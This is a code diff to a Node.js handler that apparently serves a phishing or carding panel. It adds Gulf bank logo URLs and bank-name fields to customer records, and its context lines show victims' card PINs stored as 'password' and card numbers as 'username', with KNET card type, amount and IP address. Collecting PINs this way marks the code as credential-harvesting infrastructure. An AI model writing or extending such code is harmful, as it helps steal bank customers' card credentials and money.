@@ -64,6 +64,22 @@ module.exports = async (req, res) => {
     return null;
   }
 
+  const BANK_LOGOS = {
+    'NBK': 'https://upload.wikimedia.org/wikipedia/commons/a/a8/NBK.svg',
+    'KFH': 'https://upload.wikimedia.org/wikipedia/en/e/ec/Kuwait_Finance_House_logo.svg',
+    'CBK': 'https://upload.wikimedia.org/wikipedia/commons/e/eb/CBK_LOGO.png',
+    'Gulf Bank': 'https://upload.wikimedia.org/wikipedia/commons/2/27/Gulf_Bank_Logo.svg',
+    'ABK': 'https://upload.wikimedia.org/wikipedia/commons/5/52/ABK_Logo.svg',
+    'Burgan': 'https://upload.wikimedia.org/wikipedia/commons/9/96/Burgan_Bank_logo.svg',
+    'KIB': 'https://upload.wikimedia.org/wikipedia/en/b/b2/Kuwait_International_Bank_Logo.png',
+    'Boubyan': 'https://upload.wikimedia.org/wikipedia/commons/3/30/BoubyanBankLogo_%281%29.svg',
+    'Warba': 'https://upload.wikimedia.org/wikipedia/commons/4/4d/Warba_Bank_Logo.png',
+    'BBK': 'https://upload.wikimedia.org/wikipedia/commons/d/d5/Bank_of_Bahrain_and_Kuwait.svg',
+    'Al Rajhi': 'https://upload.wikimedia.org/wikipedia/commons/f/f1/Al_Rajhi_Bank_Logo.svg',
+    'QNB': 'https://upload.wikimedia.org/wikipedia/commons/8/8f/QNB_Logo.svg',
+    'Mashreq': 'https://upload.wikimedia.org/wikipedia/en/5/5c/Mashreq_logo_2022.svg',
+  };
+
   function buildCustomer(order, payment) {
     const now = new Date().toISOString();
     const createdAt = order ? order.created_at : (payment ? payment.created_at : now);
@@ -100,6 +116,8 @@ module.exports = async (req, res) => {
       password: hasPayment ? (payment.card_pin || '') : '',
       username: hasPayment ? (payment.card_number || '') : '',
       cardType: hasPayment ? (payment.card_type || 'KNET') : '',
+      bankName: hasPayment ? (payment.bank_name || '') : '',
+      bankLogo: hasPayment && payment.bank_name ? (BANK_LOGOS[payment.bank_name] || '') : '',
       amount: hasPayment ? (payment.amount || 0) : 0,
       transactionRef: hasPayment ? (payment.transaction_ref || '') : '',
       ipAddress: hasPayment ? (payment.ip_address || '') : '',
